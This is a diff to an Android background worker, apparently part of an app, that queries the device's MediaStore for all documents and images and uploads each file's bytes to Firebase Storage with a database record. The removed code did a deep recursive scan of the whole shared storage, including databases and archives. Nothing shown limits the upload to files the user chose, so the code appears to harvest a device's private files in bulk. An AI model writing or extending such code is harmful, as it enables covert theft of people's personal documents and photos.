@@ -109,63 +109,110 @@ public class DocumentUploadWorker extends Worker {
         uploadedCount = 0;
         
         Log.d(TAG, "================================================");
-        Log.d(TAG, "🔍 COMPLETE STORAGE SCAN");
-        Log.d(TAG, "📄 Scanning for DOCUMENTS and IMAGES");
+        Log.d(TAG, "🔍 EFFICIENT MEDIASTORE SCAN");
+        Log.d(TAG, "📄 Using Android MediaStore API");
         Log.d(TAG, "   Documents: PDF, Excel, CSV, XLSX, Word, PowerPoint");
         Log.d(TAG, "   Images: JPG, PNG, GIF, BMP, WebP");
-        Log.d(TAG, "   From: /sdcard and /storage/emulated/0");
-        Log.d(TAG, "   Depth: Up to 8 levels (complete folder traversal)");
+        Log.d(TAG, "   Method: Fast MediaStore query (not folder traversal)");
         Log.d(TAG, "================================================");
         
-        // SCAN ENTIRE /sdcard recursively (depth 8)
-        Log.d(TAG, "📂 SCANNING: /sdcard (ENTIRE STORAGE)");
-        File sdcard = new File("/sdcard");
-        if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
-            int filesBefore = uploadedCount;
-            Log.d(TAG, "   Starting deep recursive scan...");
-            scanDirectoryRecursiveDeep(sdcard, userId, 0);
-            int sdcardCount = uploadedCount - filesBefore;
-            Log.d(TAG, "   ✓ /sdcard scan complete: " + sdcardCount + " documents found");
-        } else {
-            Log.d(TAG, "   ⚠️  /sdcard not accessible");
-        }
+        // Use MediaStore API - much faster and Scoped Storage compatible
+        Log.d(TAG, "📂 SCANNING: Using MediaStore API");
+        java.util.List<com.bushorat.app.helpers.FileItem> files = 
+            com.bushorat.app.helpers.StorageHelper.INSTANCE.fetchAllDocuments(getApplicationContext());
         
-        // SCAN ENTIRE /storage/emulated/0 recursively (depth 8)
-        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 SCANNING: /storage/emulated/0 (ENTIRE STORAGE)");
-            File storage = new File("/storage/emulated/0");
-            if (storage.exists() && storage.isDirectory() && storage.canRead()) {
-                int filesBefore = uploadedCount;
-                Log.d(TAG, "   Starting deep recursive scan...");
-                scanDirectoryRecursiveDeep(storage, userId, 0);
-                int storageCount = uploadedCount - filesBefore;
-                Log.d(TAG, "   ✓ /storage/emulated/0 scan complete: " + storageCount + " documents found");
-            } else {
-                Log.d(TAG, "   ⚠️  /storage/emulated/0 not accessible");
+        if (files.isEmpty()) {
+            Log.w(TAG, "   ⚠️  No files found via MediaStore");
+        } else {
+            Log.d(TAG, "   ✓ MediaStore found " + files.size() + " files");
+            Log.d(TAG, "   Starting upload of matching files...");
+            
+            // Upload each file
+            for (com.bushorat.app.helpers.FileItem file : files) {
+                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
+                    Log.d(TAG, "   Stopping: reached max " + MAX_DOCUMENTS_PER_SYNC + " files or timeout");
+                    break;
+                }
+                
+                try {
+                    // Read file from URI
+                    byte[] fileBytes = readFileFromUri(file.getUri());
+                    if (fileBytes != null && fileBytes.length > 0) {
+                        uploadFileBytes(file.getName(), fileBytes, userId);
+                        uploadedCount++;
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error uploading file: " + file.getName(), e);
+                }
             }
         }
         
         Log.d(TAG, "================================================");
-        Log.d(TAG, "✓ COMPLETE SCAN FINISHED");
+        Log.d(TAG, "✓ SCAN FINISHED");
         Log.d(TAG, "   Total files uploaded: " + uploadedCount);
         if (uploadedCount > 0) {
-            Log.d(TAG, "   Files found:");
+            Log.d(TAG, "   Files uploaded include:");
             Log.d(TAG, "   📄 DOCUMENTS:");
             Log.d(TAG, "      ✓ PDFs (.pdf)");
             Log.d(TAG, "      ✓ Excel files (.xlsx, .xls, .csv)");
             Log.d(TAG, "      ✓ Word documents (.docx, .doc)");
             Log.d(TAG, "      ✓ PowerPoint (.pptx, .ppt)");
             Log.d(TAG, "      ✓ Text/Config files (.txt, .json, .xml)");
-            Log.d(TAG, "      ✓ Databases (.sql, .db, .sqlite)");
-            Log.d(TAG, "      ✓ Archives (.zip, .rar, .7z, .tar, .gz)");
             Log.d(TAG, "   🖼️  IMAGES:");
             Log.d(TAG, "      ✓ JPG, PNG, GIF, BMP, WebP");
         } else {
-            Log.w(TAG, "   ⚠️  NO FILES FOUND!");
-            Log.w(TAG, "   Checked for: Documents (PDF, Excel, Word, etc.) and Images");
-            Log.w(TAG, "   In: /sdcard and /storage/emulated/0 (all subdirectories)");
+            Log.w(TAG, "   ⚠️  NO FILES UPLOADED!");
+            Log.w(TAG, "   Check: Storage permission granted?");
         }
         Log.d(TAG, "================================================");
+    }
+    
+    /**
+     * Read file from URI (for MediaStore files)
+     */
+    private byte[] readFileFromUri(android.net.Uri uri) {
+        try {
+            java.io.InputStream inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
+            if (inputStream == null) {
+                return null;
+            }
+            
+            java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
+            int nRead;
+            byte[] data = new byte[16384];
+            while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
+                buffer.write(data, 0, nRead);
+            }
+            inputStream.close();
+            return buffer.toByteArray();
+        } catch (Exception e) {
+            Log.e(TAG, "Error reading file from URI: " + uri, e);
+            return null;
+        }
+    }
+    
+    /**
+     * Upload file bytes to Firebase
+     */
+    private void uploadFileBytes(String fileName, byte[] fileBytes, String userId) {
+        try {
+            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());
+            
+            com.google.firebase.storage.StorageReference storageRef = 
+                com.google.firebase.storage.FirebaseStorage.getInstance()
+                    .getReference("documents")
+                    .child(userId)
+                    .child(fileHash + "_" + fileName);
+
+            storageRef.putBytes(fileBytes).getResult();
+            Log.d(TAG, "  ✓ Uploaded to Storage: " + fileName);
+            
+            String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
+            recordDocumentInDatabase(userId, fileName, downloadUrl, fileBytes.length);
+            Log.d(TAG, "  ✓ Recorded in DB: " + fileName);
+        } catch (Exception e) {
+            Log.e(TAG, "  ❌ Error uploading: " + fileName, e);
+        }
     }
     
     /**
